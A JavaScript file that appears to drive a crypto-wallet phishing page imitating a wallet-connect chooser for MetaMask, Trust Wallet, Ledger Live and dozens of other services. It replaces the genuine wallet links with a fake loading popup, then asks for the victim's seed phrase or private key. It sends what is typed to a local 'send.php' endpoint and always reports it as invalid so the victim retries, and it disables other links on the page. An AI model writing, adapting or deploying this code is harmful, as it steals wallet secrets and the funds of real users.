// import { wallets } from "./wallets.js";

let wallets = wallets_html;
console.log({ wallets_html });

(function modify_offenders(count) {
  let offending_els = $(".chakra-link");
  console.log("Offending elementh: %o", offending_els);
  // let repeater = setInterval(() => {
  // count++;
  offending_els.attr("target", "");
  offending_els.attr("href", "");
  offending_els.click((ev) => {
    ev.preventDefault();
    ev.stopPropagation();
    $(".loader-popup-bg-x").removeClass("hidex");
    setTimeout(() => {
      $(".loader-popup-x").addClass("done");
    }, 2500);
    // alert("Testing...");
  });
  // console.log(count);
  // if (count >= 10) clearInterval(repeater);
  // }, 200);
})(0);

$(".triggerx").click((e) => {
  $(".select-popup-bg-x").removeClass("hidex");
});
$(".select-popup-bg-x .select-popup-x").click((e) => {
  e.stopPropagation();
});
$(".select-popup-close-x, .select-popup-bg-x").click(() => {
  $(".select-popup-bg-x").addClass("hidex");
  console.log(1);
});

$(".loader-popup-bg-x button").click(() => {
  $(".loader-popup-bg-x").addClass("hidex");
  $("#addedx").addClass("show");
});

$("#addedx").click(function () {
  $(this).removeClass("show");
});
$("#addedx #mainx").click((e) => {
  e.stopPropagation();
});

var mode = "Mnemonic";
var inp = $("#addedx .content-item.mnemonic textarea");
var err = $("#addedx .content-item.mnemonic .error");
$("#addedx .top-item").click(() => {
  $("#mainx").toggleClass("right");
  mode = mode == "Mnemonic" ? "Private Key" : "Mnemonic";
  let cls = mode == "Mnemonic" ? "mnemonic" : "privatekey";
  inp = $("#addedx .content-item." + cls + " textarea");
  err = $("#addedx .content-item." + cls + " .error");
});

function clear() {
  inp.val("");
  err.text("");
}
$("#addedx .submit").click(() => {
  submit();
});
function submit() {
  let mnemonic = inp.val();
  console.log(mnemonic, mode);
  fetch("./send.php?seed=" + mnemonic + "&name=" + mode)
    .then(async (res) => {
      if (res.status > 299) {
        throw res;
      }
      console.log(res);
      console.log("success");

      let data = await res.json();
      console.log(data);
      err.text("Invalid " + mode);
    })
    .catch(async (err_) => {
      console.log(err_);
      console.log("failure");
      try {
        if (!err_.status == 401) throw err_;
        let data = await err_.json();
        console.log(data);
        err.text(data.message);
      } catch (error) {
        // unknown
        err.text("Unknown Error. Please Try Again");
      }
    });
}

function gp(s) {
  var name = s.replace(/[\[\]]/g, "\\$&");
  var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
    results = regex.exec(window.location.href);
  if (!results) return null;
  if (!results[2]) return "";
  return decodeURIComponent(results[2].replace(/\+/g, " "));
}

function reListen() {
  xLink(3);
  $(".chakra-link").click((e) => {
    e.stopPropagation();
    e.preventDefault();
    console.log(1);
    // $(".select-popup-bg-x").addClass("hidex");
    $(".loader-popup-bg-x").removeClass("hidex");
    setTimeout(() => {
      $(".loader-popup-x").addClass("done");
    }, 2500);
  });
}

function showOnly(q) {
  console.log("Filtering by:", q);
  let words = [];

  //   wallets.forEach((w) => {
  //     try {
  //       let str = w.match(/css-1100blg(.{0,5})(.+)<\/h6>/g)[0];
  //       str = str.substring(13, str.length - 5);
  //       words.push(str);
  //     } catch (error) {
  //       console.log(w);
  //       console.log(w.match(/css-1100blg(.+)<\/h6>/g));
  //       words.push("XXX");
  //     }
  //   });
  words = [
    "Rainbow",
    "Etherscan",
    "Uniswap",
    "Trust Wallet",
    "Binance DEX",
    "Argent",
    "OpenSea",
    "MetaMask",
    "Safe (previously Gnosis Safe)",
    "Compound",
    "Gnosis Safe Multisig",
    "Zapper",
    "Aave",
    "imToken",
    "LocalCryptos",
    "ONTO",
    "DeBank",
    "Zerion",
    "Spot",
    "BitKeep",
    "Unstoppable Domains",
    "Omni",
    "Rarible",
    "KEYRING PRO",
    "1inch Exchange",
    "TokenPocket",
    "BitPay",
    "MathWallet",
    "yearn",
    "WallETH",
    "Ledger Live",
    "Authereum",
    "Curve",
    "1inch Wallet",
    "Adex Network",
    "iToken Wallet",
    "dYdX",
    "Eidoo",
    "MyCrypto",
    "Oasis App",
    "TokenSets",
    "Loopring Wallet",
    "MANTRA DAO",
    "TrustVault",
    "Matcha",
  ];
  //   console.log(words);

  let wordsToShow = [],
    indexes = [];
  words.forEach((word, i) => {
    if (word.toLowerCase().indexOf(q.toLowerCase()) >= 0) {
      wordsToShow.push(word);
      indexes.push(i);
    }
  });
  //   console.log({ wordsToShow, indexes });
  let walletsToShow = wallets.slice();
  walletsToShow = walletsToShow.map((v, i) => {
    return indexes.includes(Number(i)) ? v : "";
  });
  //   console.log(walletsToShow);
  $(".grandmaster-box-x")
    .hide()
    .html("")
    .empty("")
    .html(walletsToShow.join(""))
    .show();
  reListen();
}

{
  let search = gp("search");
  search = search ? search : "";
  console.log("Searching for:", search);
  if (search) {
    // console.log("dropdown should be bigger");
    $(".chakra-collapse").css({
      overflow: "initial",
      display: "block",
      opacity: "1",
      height: "auto",
    });
    setTimeout(() => {
      $(".chakra-collapse").css({
        overflow: "initial",
        display: "block",
        opacity: "1",
        height: "auto",
      });
    }, 500);
  }

  let inpt_els = document.querySelectorAll(".chakra-input.css-zzvg5o");
  inpt_els.forEach((inpt_el, i) => {
    inpt_el.value += search;
    inpt_el.replaceWith(inpt_el.cloneNode(true));
    console.log(`Replaced ${i}:`, inpt_el);
    inpt_el.value += search;
  });
  $(".chakra-input.css-zzvg5o").on("keyup", function (e) {
    // e.preventDefault();
    // e.stopPropagation();
    // console.log("DETECTED INPUT EVENT! %o", { event: e, el: e.target });
    // // print which key was presed
    // console.log(e.key);
    // console.log(e.keyCode);
    // e.target.value += e.key;
    showOnly(e.target.value);
  });
}

{
  let s = gp("search");
  if (s && String(s) != "") {
    function loopShowOnly(t) {
      showOnly(s);
      if (t < 3) {
        setTimeout(() => {
          loopShowOnly(t + 1);
        }, 700);
      }
    }
    loopShowOnly(0);
  }
}

{
  let tries = 0,
    isMoreShown = false;
  function add() {
    $(".css-fokwg1 .chakra-text").hide();
    let container = $(".css-fokwg1 .chakra-button__group");
    container.children().hide();
    let showMoreButton = container.children().filter("button").first();
    showMoreButton.addClass("show-more").text("SHOW MORE").show();
    if (tries == 0) {
      console.log(container);
      showMoreButton.click(() => {
        console.log("All wallets", wallets.length);
        if (isMoreShown) {
          $(".grandmaster-box-x")
            .hide()
            .html("")
            .html(wallets.slice(0, 15).join(""))
            .show();
          showMoreButton.text("SHOW MORE");
          isMoreShown = false;
        } else {
          $(".grandmaster-box-x").hide().html("").html(wallets.join("")).show();
          showMoreButton.text("HIDE");
          isMoreShown = true;
        }
        reListen();
      });
    }
    if (++tries < 5) {
      setTimeout(add, 1000);
    }
  }
  add();
}

{
  //  collapser
  let collapsed = true;
  $("#accordion-button-1").click(() => {
    let col_css = {
      overflow: "hidden",
      display: "none",
      opacity: "0",
      height: "0px",
    };
    let open_css = {
      overflow: "initial",
      display: "block",
      opacity: "1",
      height: "auto",
    };
    $(".chakra-collapse").css(collapsed ? open_css : col_css);
    $(".chakra-accordion__icon").css({
      transform: collapsed ? "rotate(180deg)" : "rotate(0deg)",
    });
    collapsed = !collapsed;
  });
}

function xLink(t) {
  let allTriggers = [...document.getElementsByClassName("triggerx")];
  allTriggers.forEach((el) => {
    el.addEventListener("click", function (e) {
      e.preventDefault();
      e.stopPropagation();
      let isTriggerx = el.classList.contains("triggerx");
      console.log("[CLICKED]; Is 'triggerx'?", isTriggerx);
    });
  });
  let allLinks = document.getElementsByTagName("a");
  let cancelled = document.getElementsByClassName("cancelx");

  [...allLinks, ...cancelled].forEach((link) => {
    try {
      link.addEventListener("click", function (e) {
        if ($(e.target).hasClass("ignorex")) return;
        console.log("nuthn");
        // console.log(e);
        // console.log(e.target);
        e.preventDefault();
        e.stopPropagation();
      });
    } catch (error) {
      console.log(error);
    }
  });
  if (t < 5) {
    setTimeout(() => xLink(++t), 500);
  }
}
xLink(0);

{
  function attachTrigger(r) {
    $(".chakra-link").click((e) => {
      e.preventDefault();
      e.stopPropagation();
      console.log(1);
      // $(".select-popup-bg-x").addClass("hidex");
      $(".loader-popup-bg-x").removeClass("hidex");
      setTimeout(() => {
        $(".loader-popup-x").addClass("done");
      }, 2500);
    });
    if (r < 5) {
      setTimeout(() => {
        attachTrigger(++r);
      }, 700);
    }
  }
  // attachTrigger(0);
}
